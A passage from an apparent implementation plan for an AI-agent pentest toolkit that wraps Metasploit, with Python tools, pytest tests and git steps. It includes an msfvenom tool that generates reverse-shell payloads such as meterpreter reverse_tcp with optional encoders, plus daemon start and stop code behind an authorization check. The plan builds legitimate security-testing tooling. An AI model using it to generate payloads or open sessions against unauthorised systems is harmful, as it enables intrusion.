    return _targets_root() / target / "loot" / "payloads"


def _run_msfvenom(cmd: list[str], timeout: int = 120) -> dict:
    """Invoke msfvenom. Pulled out for test mocking."""
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {
            "stdout": proc.stdout,
            "stderr": proc.stderr,
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": f"msfvenom timed out after {timeout}s",
                "returncode": -1}
    except FileNotFoundError:
        return {"stdout": "", "stderr": "msfvenom not found in PATH "
                "(install via `metasploit-framework` package)", "returncode": 127}


@tool(
    "msfvenom_generate",
    "Generate a Metasploit payload via msfvenom. Writes the binary to "
    "targets/<target>/loot/payloads/<name>-<sha8>.<ext> and records an "
    "ArtifactFact in the KB. Common payloads: windows/x64/meterpreter/reverse_tcp, "
    "linux/x64/shell_reverse_tcp.",
    {
        "type": "object",
        "properties": {
            "payload": {"type": "string",
                        "description": "MSF payload name (e.g. windows/x64/meterpreter/reverse_tcp)"},
            "lhost": {"type": "string", "description": "Listener host"},
            "lport": {"type": "integer", "default": 4444,
                      "description": "Listener port"},
            "format": {"type": "string", "default": "exe",
                       "description": "Output format (exe, elf, raw, python, ...)"},
            "target": {"type": "string",
                       "description": "Target identifier — determines loot dir and KB"},
            "encoder": {"type": "string", "default": "",
                        "description": "Optional encoder (e.g. x64/shikata_ga_nai)"},
            "iterations": {"type": "integer", "default": 1,
                           "description": "Encoder iterations (only if encoder set)"},
            "bad_chars": {"type": "string", "default": "",
                          "description": "Bytes to avoid (e.g. '\\x00\\x0a\\x0d')"},
            "options": {"type": "object", "default": {},
                        "description": "Extra payload options as KEY=VALUE map"},
        },
        "required": ["payload", "lhost", "target"],
    },
)
async def msfvenom_generate(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    payload = args["payload"]
    lhost = args["lhost"]
    lport = int(args.get("lport", 4444))
    fmt = args.get("format", "exe") or "exe"
    target = args["target"]
    encoder = (args.get("encoder") or "").strip()
    iterations = int(args.get("iterations", 1) or 1)
    bad_chars = args.get("bad_chars") or ""
    options = args.get("options") or {}

    loot_dir = _payload_loot_dir(target)
    loot_dir.mkdir(parents=True, exist_ok=True)
    stem = _mangle_payload_name(payload)
    # We don't know the sha8 until after msfvenom runs; write to a temp name
    # then rename. Use a fixed temp-stem with the process PID so concurrent
    # invocations don't collide.
    tmp_path = loot_dir / f"{stem}-tmp-{os.getpid()}.{fmt}"

    cmd: list[str] = ["msfvenom", "-p", payload,
                      f"LHOST={lhost}", f"LPORT={lport}",
                      "-f", fmt, "-o", str(tmp_path)]
    if encoder:
        cmd += ["-e", encoder, "-i", str(iterations)]
    if bad_chars:
        cmd += ["-b", bad_chars]
    for k, v in options.items():
        cmd.append(f"{k}={v}")

    proc = _run_msfvenom(cmd)
    if proc["returncode"] != 0 or not tmp_path.is_file():
        # Clean up the temp file if it was created
        if tmp_path.is_file():
            try:
                tmp_path.unlink()
            except OSError:
                pass
        return format_error(
            f"msfvenom failed (rc={proc['returncode']}): "
            f"{proc['stderr'][:1000] or proc['stdout'][:1000]}"
        )

    data = tmp_path.read_bytes()
    sha = hashlib.sha256(data).hexdigest()
    sha8 = sha[:8]
    final_path = loot_dir / f"{stem}-{sha8}.{fmt}"
    tmp_path.rename(final_path)

    try:
        kb = for_target(target)
        kb.record_artifact(ArtifactFact(
            kind="payload",
            path=str(final_path),
            sha256=sha,
            source_tool="msfvenom",
        ))
    except Exception:
        pass  # best-effort

    summary = (
        f"msfvenom payload generated:\n"
        f"  path:    {final_path}\n"
        f"  payload: {payload}\n"
        f"  size:    {len(data)} bytes\n"
        f"  sha256:  {sha}"
    )
    return format_tool_result(summary)


TOOLS.append(msfvenom_generate)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_msfvenom.py -v
```
Expected: PASS — 7 tests.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_msfvenom.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): msfvenom_generate tool with KB artifact write"
```

---

## Task 5: Register msfvenom in tool registry

**Files:**
- Modify: `tests/test_tool_registry.py` (count bump + new assertion)

The module is already wired (Task 3); msfvenom is appended to `TOOLS` so it auto-registers. Only the count assertion and a new visibility test need to change.

- [ ] **Step 1: Write the failing tests**

Modify `tests/test_tool_registry.py` — bump the count to 71 and add msfvenom assertion:

Replace:
```python
    assert len(ALL_TOOLS) == 70, (
        f"expected 70 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 68, (
        f"expected 68 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

with:
```python
    assert len(ALL_TOOLS) == 71, (
        f"expected 71 registered tools, got {len(ALL_TOOLS)}"
    )
    unique_names = {t.name for t in ALL_TOOLS}
    assert len(unique_names) == 69, (
        f"expected 69 unique tools (with 2 pre-existing dups), got {len(unique_names)}"
    )
```

Add at the bottom:

```python
def test_msfvenom_generate_registered():
    names = {t.name for t in ALL_TOOLS}
    assert "msfvenom_generate" in names
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: PASS for the new visibility test (msfvenom is already in TOOLS), FAIL for the count assertion (says 71, sees 70 because we expected the assertion was matching 70 — but with task 4 added, it's now 71 in reality). Actually: task 4 added msfvenom to TOOLS list. So in reality the count is now 71 and the OLD assertion of 70 in the file will fail before we patch.

Re-run the suite to confirm: the count must now be 71 in reality.

- [ ] **Step 3: Apply the patch above to `tests/test_tool_registry.py`**

Already shown in Step 1.

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_tool_registry.py -v
```
Expected: PASS — count is 71 and both searchsploit + msfvenom are present.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add tests/test_tool_registry.py
git -C .worktrees/metasploit-bridge commit -m "test(registry): assert msfvenom_generate registered (ALL_TOOLS 70→71)"
```

---

## Task 6: Pidfile + process-alive + flock helpers

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add helpers)
- Modify: `tests/test_metasploit_helpers.py` (add tests)

Add the pidfile read/write/remove helpers, `_process_alive(pid)`, and the `_start_lock()` context manager. These prepare the ground for `metasploit_start`.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_metasploit_helpers.py`:

```python
import time
from contextlib import contextmanager


def test_pidfile_read_when_missing(tmp_targets_dir):
    from reverser.tools.metasploit import _read_pidfile
    assert _read_pidfile() is None


def test_pidfile_write_then_read(tmp_targets_dir):
    from reverser.tools.metasploit import _read_pidfile, _write_pidfile
    _write_pidfile(12345)
    assert _read_pidfile() == 12345


def test_pidfile_remove(tmp_targets_dir):
    from reverser.tools.metasploit import _read_pidfile, _write_pidfile, _remove_pidfile
    _write_pidfile(99)
    _remove_pidfile()
    assert _read_pidfile() is None


def test_pidfile_remove_when_missing_is_noop(tmp_targets_dir):
    from reverser.tools.metasploit import _remove_pidfile
    # Should not raise
    _remove_pidfile()


def test_pidfile_corrupted_returns_none(tmp_targets_dir):
    from reverser.tools.metasploit import _read_pidfile, _pidfile_path
    _pidfile_path().write_text("not-a-number")
    assert _read_pidfile() is None


def test_process_alive_self_returns_true():
    from reverser.tools.metasploit import _process_alive
    assert _process_alive(os.getpid()) is True


def test_process_alive_huge_pid_returns_false():
    from reverser.tools.metasploit import _process_alive
    # PID 2_000_000_000 almost certainly doesn't exist
    assert _process_alive(2_000_000_000) is False


def test_start_lock_acquires_and_releases(tmp_targets_dir):
    from reverser.tools.metasploit import _start_lock
    with _start_lock() as lock_fd:
        assert lock_fd is not None
    # Should be able to re-acquire (released on context exit)
    with _start_lock() as lock_fd2:
        assert lock_fd2 is not None


def test_start_lock_creates_lock_file(tmp_targets_dir):
    from reverser.tools.metasploit import _start_lock, _lock_path
    with _start_lock():
        assert _lock_path().is_file()
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_helpers.py -v
```
Expected: FAIL — `_read_pidfile`, `_start_lock`, etc. not defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py` (after the auth helpers, before the searchsploit section):

```python
# ── Pidfile + process liveness ──────────────────────────────────────

def _read_pidfile() -> int | None:
    """Read the pidfile or return None if missing/corrupted."""
    path = _pidfile_path()
    if not path.is_file():
        return None
    try:
        return int(path.read_text().strip())
    except (ValueError, OSError):
        return None


def _write_pidfile(pid: int) -> None:
    """Atomically write the daemon PID."""
    path = _pidfile_path()
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(str(pid))


def _remove_pidfile() -> None:
    """Remove the pidfile; no-op if absent."""
    path = _pidfile_path()
    if path.is_file():
        try:
            path.unlink()
        except OSError:
            pass


def _process_alive(pid: int) -> bool:
    """Return True iff signal 0 to pid succeeds (process exists)."""
    try:
        os.kill(pid, 0)
        return True
    except (OSError, ProcessLookupError):
        return False


# ── Start-lock (D11: concurrent-start serialization) ────────────────

import fcntl


@contextmanager
def _start_lock():
    """Acquire an fcntl flock on auth.json.lock for the duration of start.

    Linux + macOS supported (fcntl.flock works on both). Windows is not
    supported (msfrpcd doesn't run on Windows anyway).
    """
    lock_path = _lock_path()
    lock_path.parent.mkdir(parents=True, exist_ok=True)
    fd = os.open(str(lock_path), os.O_CREAT | os.O_RDWR, 0o600)
    try:
        fcntl.flock(fd, fcntl.LOCK_EX)
        yield fd
    finally:
        try:
            fcntl.flock(fd, fcntl.LOCK_UN)
        except OSError:
            pass
        os.close(fd)
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_helpers.py -v
```
Expected: PASS — 17 tests total (8 old + 9 new).

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_helpers.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): pidfile + flock helpers"
```

---

## Task 7: RPC-ready poll + MsfRpcClient wrapper

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add helpers)
- Modify: `tests/test_metasploit_helpers.py` (add tests)

`_wait_for_rpc_ready(auth, timeout)` polls `core.version` every 1s until the daemon answers. `_msf_client(target)` constructs an authed `MsfRpcClient`, ensures the per-target workspace exists, and switches to it. These wrap the pymetasploit3 library.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_metasploit_helpers.py`:

```python
from unittest.mock import patch, MagicMock


def test_wait_for_rpc_ready_succeeds_quickly(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import _wait_for_rpc_ready
    auth = {"user": "msf", "password": "x", "host": "127.0.0.1",
            "port": 55553, "ssl": False}
    mock_client = MagicMock()
    mock_client.core.version = {"version": "6.4.0"}
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=mock_client):
        assert _wait_for_rpc_ready(auth, timeout_seconds=2) is True


def test_wait_for_rpc_ready_times_out(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import _wait_for_rpc_ready
    auth = {"user": "msf", "password": "x", "host": "127.0.0.1",
            "port": 55553, "ssl": False}
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               side_effect=ConnectionError("refused")):
        # Use a short timeout so the test is fast
        start = time.time()
        ok = _wait_for_rpc_ready(auth, timeout_seconds=1)
        elapsed = time.time() - start
    assert ok is False
    assert elapsed >= 1.0  # waited at least the timeout


def test_msf_client_creates_workspace_for_target(tmp_targets_dir, monkeypatch):
    from reverser.tools.metasploit import _msf_client
    mock_client = MagicMock()
    mock_console = MagicMock()
    mock_client.consoles.console.return_value = mock_console
    # Existing workspaces don't include our target; client should add it
    mock_console.run_with_output.return_value = "Workspaces\n* default\n"
    with patch("reverser.tools.metasploit._make_msfrpc_client",
               return_value=mock_client):
        with patch("reverser.tools.metasploit._read_or_create_auth",
                   return_value={"user": "msf", "password": "x",
                                 "host": "127.0.0.1", "port": 55553, "ssl": False}):
            client = _msf_client("10.10.10.5")
    assert client is mock_client
    # Should have asked the console to add + use the workspace
    calls = [str(c) for c in mock_console.run_with_output.call_args_list]
    joined = " ".join(calls)
    assert "workspace -a" in joined
    assert "10.10.10.5" in joined


def test_workspace_name_for_target():
    from reverser.tools.metasploit import _workspace_name_for
    # Plain IPs are unchanged
    assert _workspace_name_for("10.10.10.5") == "10.10.10.5"
    # Workspace names are case-sensitive in MSF; we keep them as-is after
    # normalize_target (which lowercases). Hostnames OK.
    assert _workspace_name_for("DC01.CORP.LOCAL") == "dc01.corp.local"
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_helpers.py -v
```
Expected: FAIL — `_wait_for_rpc_ready`, `_msf_client`, `_workspace_name_for` not defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py` (after the flock helpers):

```python
# ── pymetasploit3 wrappers ──────────────────────────────────────────

import time

from ..kb.store import normalize_target


def _make_msfrpc_client(auth: dict):
    """Construct an authed pymetasploit3.MsfRpcClient.

    Pulled out for test mocking — tests can monkey-patch this function to
    avoid importing pymetasploit3 in the test process.
    """
    from pymetasploit3.msfrpc import MsfRpcClient
    return MsfRpcClient(
        auth["password"],
        username=auth.get("user", DEFAULT_RPC_USER),
        server=auth["host"],
        port=auth["port"],
        ssl=bool(auth.get("ssl", False)),
    )


def _wait_for_rpc_ready(auth: dict, *,
                        timeout_seconds: int = _RPC_READY_TIMEOUT_DEFAULT) -> bool:
    """Poll core.version every 1s up to timeout_seconds. Returns True on success."""
    deadline = time.time() + timeout_seconds
    while time.time() < deadline:
        try:
            client = _make_msfrpc_client(auth)
            _ = client.core.version
            return True
        except Exception:
            time.sleep(1.0)
    return False


def _workspace_name_for(target: str) -> str:
    """Return the MSF workspace name for a target.

    Uses normalize_target (lowercase + strip) so the same target always maps
    to the same workspace regardless of the casing the user typed.
    """
    return normalize_target(target)


def _msf_client(target: str):
    """Return an authed client with the per-target workspace active.

    Workflow:
      1. Read shared auth.
      2. Construct authenticated MsfRpcClient.
      3. Ensure workspace exists (workspace -a <name>; idempotent).
      4. Switch active workspace (workspace <name>).
      5. Return the client.
    """
    auth = _read_or_create_auth()
    client = _make_msfrpc_client(auth)
    ws = _workspace_name_for(target)

    console = client.consoles.console()
    try:
        # workspace -a is idempotent in MSF (adds if missing, no-op if present)
        console.run_with_output(f"workspace -a {ws}")
        # Switch active
        console.run_with_output(f"workspace {ws}")
    except Exception:
        # If the console layer fails, the client is still usable — return it
        pass

    return client
```

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_helpers.py -v
```
Expected: PASS — 21 tests total (17 old + 4 new).

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_helpers.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): msfrpc client wrapper + workspace activation"
```

---

## Task 8: metasploit_start tool

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool)
- Create: `tests/test_metasploit_lifecycle.py`

The lifecycle entry point. Acquires the flock, reads/creates auth, checks the pidfile (idempotent), spawns `msfrpcd -U <user> -P <password> -a 127.0.0.1 -p 55553 -S -f`, polls for RPC readiness, activates the per-target workspace, returns a structured payload.

- [ ] **Step 1: Write the failing tests**

Create `tests/test_metasploit_lifecycle.py`:

```python
"""Tests for metasploit_start / _stop / _status lifecycle tools.

Subprocess.Popen and _wait_for_rpc_ready are mocked — these tests run without
a real msfrpcd daemon.
"""

import asyncio
import os
import signal
from unittest.mock import patch, MagicMock

import pytest


def _call(tool_obj, args):
    fn = getattr(tool_obj, "handler", None) or getattr(tool_obj, "fn", None) or tool_obj
    loop = asyncio.new_event_loop()
    try:
        return loop.run_until_complete(fn(args))
    finally:
        loop.close()


# ── metasploit_start ────────────────────────────────────────────────


def test_metasploit_start_requires_auth(tmp_targets_dir, monkeypatch):
    monkeypatch.delenv("REVERSER_PENTEST_AUTHORIZED", raising=False)
    monkeypatch.chdir(tmp_targets_dir)
    from reverser.tools.metasploit import metasploit_start
    result = _call(metasploit_start, {"target": "10.10.10.5"})
    assert result.get("is_error") is True


def test_metasploit_start_spawns_daemon_and_writes_pidfile(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_start, _read_pidfile

    mock_proc = MagicMock()
    mock_proc.pid = 99887
    mock_proc.poll.return_value = None  # still running

    with patch("reverser.tools.metasploit.subprocess.Popen",
               return_value=mock_proc) as mock_popen, \
         patch("reverser.tools.metasploit._wait_for_rpc_ready",
               return_value=True), \
         patch("reverser.tools.metasploit._msf_client") as mock_client:
        mock_client.return_value = MagicMock()
        result = _call(metasploit_start, {"target": "10.10.10.5"})

    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "started" in text.lower()
    assert "99887" in text
    assert _read_pidfile() == 99887

    # The Popen call should include msfrpcd, -U msf, -P <password>, -a 127.0.0.1,
    # -p 55553, -S (no SSL), -f (foreground)
    args, kwargs = mock_popen.call_args
    cmd = args[0]
    assert cmd[0] == "msfrpcd"
    assert "-U" in cmd
    assert "msf" in cmd
    assert "-P" in cmd
    assert "-a" in cmd
    assert "127.0.0.1" in cmd
    assert "-p" in cmd
    assert "55553" in cmd
    assert "-S" in cmd
    assert "-f" in cmd
    # start_new_session=True for orphan-safe spawn
    assert kwargs.get("start_new_session") is True


def test_metasploit_start_idempotent_when_already_running(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import (
        metasploit_start, _write_pidfile,
    )
    _write_pidfile(os.getpid())  # use self-pid; will pass _process_alive

    with patch("reverser.tools.metasploit.subprocess.Popen") as mock_popen, \
         patch("reverser.tools.metasploit._msf_client") as mock_client:
        mock_client.return_value = MagicMock()
        result = _call(metasploit_start, {"target": "10.10.10.5"})

    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "already" in text.lower() or "running" in text.lower()
    mock_popen.assert_not_called()


def test_metasploit_start_recovers_stale_pidfile(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_start, _write_pidfile, _read_pidfile
    _write_pidfile(2_000_000_000)  # PID definitely doesn't exist

    mock_proc = MagicMock()
    mock_proc.pid = 33344
    mock_proc.poll.return_value = None
    with patch("reverser.tools.metasploit.subprocess.Popen",
               return_value=mock_proc), \
         patch("reverser.tools.metasploit._wait_for_rpc_ready",
               return_value=True), \
         patch("reverser.tools.metasploit._msf_client") as mock_client:
        mock_client.return_value = MagicMock()
        result = _call(metasploit_start, {"target": "10.10.10.5"})

    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "stale" in text.lower() or "recovered" in text.lower() or "started" in text.lower()
    assert _read_pidfile() == 33344


def test_metasploit_start_rpc_ready_timeout(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_start, _read_pidfile

    mock_proc = MagicMock()
    mock_proc.pid = 55555
    mock_proc.poll.return_value = None
    with patch("reverser.tools.metasploit.subprocess.Popen",
               return_value=mock_proc), \
         patch("reverser.tools.metasploit._wait_for_rpc_ready",
               return_value=False), \
         patch("os.killpg"):
        result = _call(metasploit_start, {"target": "10.10.10.5"})

    assert result.get("is_error") is True
    assert "rpc" in result["content"][0]["text"].lower() or \
           "timeout" in result["content"][0]["text"].lower()
    # PID file should NOT be left behind on failure
    assert _read_pidfile() is None


def test_metasploit_start_acquires_flock(tmp_targets_dir, monkeypatch):
    """Verify the start lock is acquired and released around Popen."""
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_start

    order = []
    real_start_lock = None
    from reverser.tools.metasploit import _start_lock as actual_start_lock

    from contextlib import contextmanager
    @contextmanager
    def tracking_lock():
        order.append("lock_acquired")
        with actual_start_lock() as fd:
            yield fd
        order.append("lock_released")

    mock_proc = MagicMock()
    mock_proc.pid = 12121
    mock_proc.poll.return_value = None

    def track_popen(*a, **kw):
        order.append("popen")
        return mock_proc

    with patch("reverser.tools.metasploit._start_lock", tracking_lock), \
         patch("reverser.tools.metasploit.subprocess.Popen",
               side_effect=track_popen), \
         patch("reverser.tools.metasploit._wait_for_rpc_ready", return_value=True), \
         patch("reverser.tools.metasploit._msf_client") as mock_client:
        mock_client.return_value = MagicMock()
        _call(metasploit_start, {"target": "10.10.10.5"})

    assert order == ["lock_acquired", "popen", "lock_released"]
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_lifecycle.py -v
```
Expected: FAIL — `metasploit_start` not yet defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
# ── Lifecycle tools: start / stop / status ──────────────────────────


@tool(
    "metasploit_start",
    "Start the shared msfrpcd daemon (if not already running) and activate "
    "the per-target MSF workspace. Idempotent: returns 'already_running' "
    "if the daemon is up. Stale pidfiles are auto-recovered. The daemon "
    "binds 127.0.0.1:55553 with a random 32-char password persisted at "
    "<targets_root>/.shared/msfrpc/auth.json (mode 0600).",
    {
        "type": "object",
        "properties": {
            "target": {"type": "string",
                       "description": "Target identifier — determines the MSF workspace"},
        },
        "required": ["target"],
    },
)
async def metasploit_start(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    target = args["target"]

    with _start_lock():
        existing_pid = _read_pidfile()
        if existing_pid is not None and _process_alive(existing_pid):
            # Already running — just activate the workspace.
            try:
                _msf_client(target)
            except Exception:
                pass  # workspace activation is best-effort here
            auth = _read_or_create_auth()
            return format_tool_result(
                f"msfrpcd already running.\n"
                f"  status:    already_running\n"
                f"  pid:       {existing_pid}\n"
                f"  workspace: {_workspace_name_for(target)}\n"
                f"  rpc_url:   http{'s' if auth['ssl'] else ''}"
                f"://{auth['host']}:{auth['port']}\n"
                f"  rpc_user:  {auth['user']}"
            )

        stale_recovered = False
        if existing_pid is not None and not _process_alive(existing_pid):
            _remove_pidfile()
            stale_recovered = True

        auth = _read_or_create_auth()

        cmd = [
            "msfrpcd",
            "-U", auth["user"],
            "-P", auth["password"],
            "-a", auth["host"],
            "-p", str(auth["port"]),
            "-S",   # no SSL (D9)
            "-f",   # foreground (so we can capture pid)
        ]

        try:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True,
            )
        except FileNotFoundError:
            return format_error(
                "msfrpcd not found in PATH. Install metasploit-framework."
            )

        if not _wait_for_rpc_ready(auth):
            # Daemon failed to come up — kill it and clean up
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except (ProcessLookupError, OSError):
                pass
            return format_error(
                "msfrpcd did not become RPC-ready within "
                f"{_RPC_READY_TIMEOUT_DEFAULT}s. Daemon killed; pidfile not written."
            )

        _write_pidfile(proc.pid)

        try:
            _msf_client(target)  # activate workspace
        except Exception:
            pass  # daemon is up; workspace setup is best-effort

        status = "recovered_stale_pidfile" if stale_recovered else "started"
        return format_tool_result(
            f"msfrpcd started.\n"
            f"  status:    {status}\n"
            f"  pid:       {proc.pid}\n"
            f"  workspace: {_workspace_name_for(target)}\n"
            f"  rpc_url:   http{'s' if auth['ssl'] else ''}"
            f"://{auth['host']}:{auth['port']}\n"
            f"  rpc_user:  {auth['user']}"
        )


TOOLS.append(metasploit_start)
```

Note `signal` import — ensure `import signal` is added near the top of the module if not already present.

- [ ] **Step 4: Run tests to verify they pass**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_lifecycle.py -v
```
Expected: PASS — 6 tests.

- [ ] **Step 5: Commit**

```bash
git -C .worktrees/metasploit-bridge add src/reverser/tools/metasploit.py tests/test_metasploit_lifecycle.py
git -C .worktrees/metasploit-bridge commit -m "feat(metasploit): metasploit_start lifecycle tool"
```

---

## Task 9: metasploit_stop tool with sessions-open warning

**Files:**
- Modify: `src/reverser/tools/metasploit.py` (add tool)
- Modify: `tests/test_metasploit_lifecycle.py` (add tests)

Per D10, `metasploit_stop` does NOT refuse when sessions are open — it surfaces a warning and proceeds. SIGTERM → 10s wait → SIGKILL if `force=True`.

- [ ] **Step 1: Write the failing tests**

Append to `tests/test_metasploit_lifecycle.py`:

```python
# ── metasploit_stop ─────────────────────────────────────────────────


def test_metasploit_stop_when_not_running(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_stop
    result = _call(metasploit_stop, {})
    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    assert "not running" in text.lower() or "not_running" in text.lower()


def test_metasploit_stop_clears_pidfile_after_sigterm(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_stop, _write_pidfile, _read_pidfile
    _write_pidfile(7777)

    # Fake: process exits after SIGTERM
    states = {"alive": True}
    def fake_alive(pid):
        return states["alive"]
    def fake_kill(pid, sig):
        if sig == signal.SIGTERM:
            states["alive"] = False

    with patch("reverser.tools.metasploit._process_alive", side_effect=fake_alive), \
         patch("os.kill", side_effect=fake_kill), \
         patch("reverser.tools.metasploit._msf_client") as mock_client:
        mock_client.return_value.sessions.list = {}
        result = _call(metasploit_stop, {})

    assert result.get("is_error") is not True
    assert "stopped" in result["content"][0]["text"].lower()
    assert _read_pidfile() is None


def test_metasploit_stop_warns_when_sessions_open(tmp_targets_dir, monkeypatch):
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_stop, _write_pidfile
    _write_pidfile(7777)

    states = {"alive": True}
    def fake_alive(pid):
        return states["alive"]
    def fake_kill(pid, sig):
        if sig == signal.SIGTERM:
            states["alive"] = False

    fake_client = MagicMock()
    fake_client.sessions.list = {
        "1": {"type": "meterpreter", "target_host": "10.10.10.5",
              "opened_at": "2026-05-11T12:00:00"},
        "2": {"type": "shell", "target_host": "10.10.10.6",
              "opened_at": "2026-05-11T12:05:00"},
        "3": {"type": "shell", "target_host": "10.10.10.7",
              "opened_at": "2026-05-11T12:10:00"},
    }
    with patch("reverser.tools.metasploit._process_alive", side_effect=fake_alive), \
         patch("os.kill", side_effect=fake_kill), \
         patch("reverser.tools.metasploit._msf_client", return_value=fake_client):
        result = _call(metasploit_stop, {})

    assert result.get("is_error") is not True
    text = result["content"][0]["text"]
    # Per D10: warning surfaced but NOT a refusal
    assert "3" in text  # sessions_lost count
    assert "warning" in text.lower() or "session" in text.lower()
    assert "stopped" in text.lower()


def test_metasploit_stop_force_uses_sigkill_on_timeout(tmp_targets_dir, monkeypatch):
    """With force=True, persistent process is SIGKILLed after 10s SIGTERM wait."""
    monkeypatch.setenv("REVERSER_PENTEST_AUTHORIZED", "1")
    from reverser.tools.metasploit import metasploit_stop, _write_pidfile
    _write_pidfile(7777)

    signals_received = []
    states = {"alive": True}
    def fake_alive(pid):
        return states["alive"]
    def fake_kill(pid, sig):
        signals_received.append(sig)
        if sig == signal.SIGKILL:
            states["alive"] = False

    # _msf_client throws because the daemon isn't really there
    with patch("reverser.tools.metasploit._process_alive", side_effect=fake_alive), \
         patch("os.kill", side_effect=fake_kill), \
         patch("reverser.tools.metasploit._msf_client",
               side_effect=ConnectionError("refused")), \
         patch("time.sleep"):  # skip the 10s wait
        result = _call(metasploit_stop, {"force": True})

    assert result.get("is_error") is not True
    assert signal.SIGTERM in signals_received
    assert signal.SIGKILL in signals_received
```

- [ ] **Step 2: Run tests to verify they fail**

Run:
```
.devenv/state/venv/bin/pytest tests/test_metasploit_lifecycle.py -v
```
Expected: FAIL — `metasploit_stop` not yet defined.

- [ ] **Step 3: Write the implementation**

Append to `src/reverser/tools/metasploit.py`:

```python
def _count_open_sessions() -> tuple[int, list[dict]]:
    """Best-effort count of open sessions. Returns (count, summary list).

    Returns (0, []) if the daemon isn't reachable.
    """
    try:
        auth = _read_or_create_auth()
        client = _make_msfrpc_client(auth)
        sessions = client.sessions.list or {}
    except Exception:
        return (0, [])
    summary = []
    for sid, info in sessions.items():
        summary.append({
            "id": sid,
            "type": (info or {}).get("type", "?"),
            "target_host": (info or {}).get("target_host", "?"),
        })
    return (len(summary), summary)


@tool(
    "metasploit_stop",
    "Stop the shared msfrpcd daemon. SIGTERM → 10s wait → SIGKILL if "
    "force=True. Warns (but does NOT refuse) when sessions are open. "
    "Open sessions die when the daemon stops — documented loss-on-stop.",
    {
        "type": "object",
        "properties": {
            "force": {"type": "boolean", "default": False,
                      "description": "If true, escalate to SIGKILL after 10s of SIGTERM ignored"},
        },
        "required": [],
    },
)
async def metasploit_stop(args: dict) -> dict:
    try:
        require_pentest_auth()
    except AuthorizationError as e:
        return format_error(str(e))

    force = bool(args.get("force", False))

    pid = _read_pidfile()
    if pid is None:
        return format_tool_result("msfrpcd is not running (no pidfile).\n  status: not_running")

    if not _process_alive(pid):
        _remove_pidfile()
        return format_tool_result(
            f"msfrpcd was not actually running (stale pidfile cleared).\n"
            f"  status:  not_running\n"
            f"  pid_was: {pid}"
        )

    # Best-effort session count BEFORE we kill the daemon
    sessions_lost, _summary = _count_open_sessions()

    # SIGTERM and wait up to 10s
    try:
        os.kill(pid, signal.SIGTERM)
